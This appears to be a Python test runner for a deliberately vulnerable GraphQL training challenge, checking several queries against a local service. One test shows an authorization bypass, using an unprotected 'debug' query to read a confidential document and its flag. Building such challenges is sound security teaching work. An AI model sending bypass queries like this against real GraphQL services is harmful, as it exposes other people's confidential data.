#!/usr/bin/env python3
"""
Field-level Authorization Bypass Challenge Tests
Tests for GraphQL field-level authorization bypass vulnerability
"""

import requests
import json
import sys
import time
import subprocess
import os
from urllib.parse import urljoin


class TestFieldLevelAuthBypassChallenge:
    """Test suite for Field-level Authorization Bypass Challenge"""
    
    def __init__(self, base_url="http://localhost:8004"):
        self.base_url = base_url
        self.graphql_url = urljoin(base_url, "/graphql")
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Field-Auth-Bypass-Test/1.0'
        })
        self.tests_passed = 0
        self.tests_failed = 0
    
    def start_services(self):
        """Start Docker Compose services"""
        print("🚀 Starting Field-level Authorization Bypass Challenge...")
        try:
            # Change to challenge directory
            os.chdir('../04-field-level-auth-bypass')
            subprocess.run(['docker-compose', '-f', 'docker-compose-dev.yml', 'up', '-d'], 
                         check=True, capture_output=True)
            return True
        except subprocess.CalledProcessError as e:
            print(f"❌ Failed to start services: {e}")
            return False
        finally:
            # Change back to tests directory
            os.chdir('../tests')
    
    def stop_services(self):
        """Stop Docker Compose services"""
        print("🧹 Cleaning up...")
        try:
            # Change to challenge directory
            os.chdir('../04-field-level-auth-bypass')
            subprocess.run(['docker-compose', '-f', 'docker-compose-dev.yml', 'down'], 
                         check=True, capture_output=True)
        except subprocess.CalledProcessError as e:
            print(f"⚠️ Warning: Failed to stop services: {e}")
        finally:
            # Change back to tests directory
            os.chdir('../tests')
    
    def wait_for_service(self, timeout=120):
        """Wait for the service to be ready"""
        print("⏳ Waiting for services to be ready...")
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                response = self.session.get(self.graphql_url)
                if response.status_code == 200:
                    print("✅ Services are ready")
                    return True
            except requests.exceptions.RequestException:
                pass
            time.sleep(2)
        
        print(f"❌ Services failed to start within {timeout}s")
        return False
    
    def graphql_query(self, query, variables=None, headers=None):
        """Execute a GraphQL query"""
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        
        session_headers = self.session.headers.copy()
        if headers:
            session_headers.update(headers)
        
        response = self.session.post(self.graphql_url, json=payload, headers=session_headers)
        return response
    
    def test_documents_no_auth_required(self):
        """Test that documents query works without authorization for specific user"""
        print("🧪 Test: Documents query with userId (no auth required)")
        
        try:
            query = '''
            query {
              documents(userId: 1) {
                id
                title
                confidential
              }
            }
            '''
            
            response = self.graphql_query(query)
            response_data = response.json()
            
            # Should work without authorization and return user's non-confidential documents
            if (response.status_code == 200 and 
                'data' in response_data and 
                'documents' in response_data['data'] and
                response_data['data']['documents']):
                print("✅ PASS - Documents query works without authorization for specific user")
                self.tests_passed += 1
                return True
            
            print("❌ FAIL - Documents query failed unexpectedly")
            print(f"Response: {response.text}")
            self.tests_failed += 1
            return False
            
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def test_admin_user_no_documents(self):
        """Test that admin user has no visible documents (confidential docs filtered)"""
        print("🧪 Test: Admin user documents query returns empty (confidential filtered)")
        
        try:
            query = '''
            query {
              documents(userId: 3) {
                id
                title
                confidential
              }
            }
            '''
            
            response = self.graphql_query(query)
            response_data = response.json()
            
            # Should return empty array for admin user (confidential docs filtered out)
            if (response.status_code == 200 and 
                'data' in response_data and 
                'documents' in response_data['data'] and
                len(response_data['data']['documents']) == 0):
                print("✅ PASS - Admin user has no visible documents (confidential docs filtered)")
                self.tests_passed += 1
                return True
            
            print("❌ FAIL - Admin user documents query should return empty array")
            print(f"Response: {response.text}")
            self.tests_failed += 1
            return False
            
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def test_document_auth_required(self):
        """Test that document query requires authorization"""
        print("🧪 Test: Document query requires authorization")
        
        try:
            query = '''
            query {
              document(id: 1) {
                id
                title
              }
            }
            '''
            
            response = self.graphql_query(query)
            response_data = response.json()
            
            # Should get authorization error
            if (response.status_code == 200 and 
                'errors' in response_data):
                error_msg = str(response_data['errors'])
                if 'Unauthorized' in error_msg:
                    print("✅ PASS - Document query properly protected")
                    self.tests_passed += 1
                    return True
            
            print("❌ FAIL - Document query not properly protected")
            print(f"Response: {response.text}")
            self.tests_failed += 1
            return False
            
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def test_authorization_bypass(self):
        """Test authorization bypass via debug query"""
        print("🧪 Test: Authorization bypass via debug query")
        
        try:
            # Test accessing confidential document without authorization
            query = '''
            query {
              debug(userId: 3, id: 2) {
                id
                title
                debugInfo
                owner {
                  id
                  username
                }
              }
            }
            '''
            
            response = self.graphql_query(query)
            response_data = response.json()
            
            # Should successfully bypass authorization and get flag
            if (response.status_code == 200 and 
                'data' in response_data and 
                'debug' in response_data['data'] and
                response_data['data']['debug'] is not None):
                
                document = response_data['data']['debug']
                if 'debugInfo' in document and document['debugInfo']:
                    print("✅ PASS - Successfully bypassed authorization to get flag")
                    self.tests_passed += 1
                    return True
            
            print("❌ FAIL - Could not bypass authorization")
            print(f"Response: {response.text}")
            self.tests_failed += 1
            return False
            
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def test_user_data_access(self):
        """Test accessing user data with documents without authorization"""
        print("🧪 Test: User data with documents access (no authorization required)")
        
        try:
            query = '''
            query {
              users {
                id
                username
                email
                role
                documents {
                  id
                  title
                  confidential
                }
              }
            }
            '''
            
            response = self.graphql_query(query)
            response_data = response.json()
            
            if (response.status_code == 200 and 
                'data' in response_data and 
                'users' in response_data['data'] and
                response_data['data']['users']):
                
                # Verify that admin user (id=3) has no visible documents due to confidentiality filtering
                admin_user = next((user for user in response_data['data']['users'] if user['id'] == 3), None)
                if admin_user and len(admin_user.get('documents', [])) == 0:
                    print("✅ PASS - User data with document relationships accessible, confidential docs filtered")
                    self.tests_passed += 1
                    return True
                else:
                    print("❌ FAIL - Confidential document filtering not working properly")
                    self.tests_failed += 1
                    return False
            else:
                print("❌ FAIL - Could not access user data")
                print(f"Response: {response.text}")
                self.tests_failed += 1
                return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def run_tests(self):
        """Run all field-level authorization bypass tests"""
        print("🔍 Field-level Authorization Bypass Challenge Test Runner")
        print("=========================================================")
        
        if not self.start_services():
            return False
        
        try:
            if not self.wait_for_service():
                return False
            
            print("\n🧪 Running field-level authorization bypass tests...\n")
            
            # Run tests
            self.test_user_data_access()
            self.test_documents_no_auth_required()
            self.test_admin_user_no_documents()
            self.test_document_auth_required()
            self.test_authorization_bypass()
            
            print(f"\n📊 Test Results: {self.tests_passed} passed, {self.tests_failed} failed")
            
            if self.tests_failed > 0:
                print("❌ Some tests failed")
                return False
            else:
                print("✅ All tests passed!")
                return True
                
        finally:
            self.stop_services()


def main():
    """Main function"""
    tester = TestFieldLevelAuthBypassChallenge()
    success = tester.run_tests()
    
    if success:
        print("\n🎉 Field-level Authorization Bypass Challenge tests completed successfully!")
        sys.exit(0)
    else:
        print("\n❌ Field-level Authorization Bypass Challenge tests failed!")
        sys.exit(1)


if __name__ == "__main__":
    main()